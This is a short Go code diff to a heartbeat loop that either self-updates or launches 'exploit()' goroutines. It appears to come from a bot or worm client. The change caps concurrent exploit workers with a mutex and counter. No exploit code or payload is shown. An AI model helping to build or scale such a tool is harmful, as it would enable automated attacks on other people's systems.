@@ -77,7 +77,12 @@ func heartbeat() {
 				fmt.Println("Try to update")
 				go update.Replace()
 			} else {
-				go exploit()
+				jobsMutex.Lock()
+				if currentJobs <= maxWorkers {
+					currentJobs++
+					go exploit()
+				}
+				jobsMutex.Unlock()
 			}
 		}
 		time.Sleep(time.Second * time.Duration(heartbeat_delay))
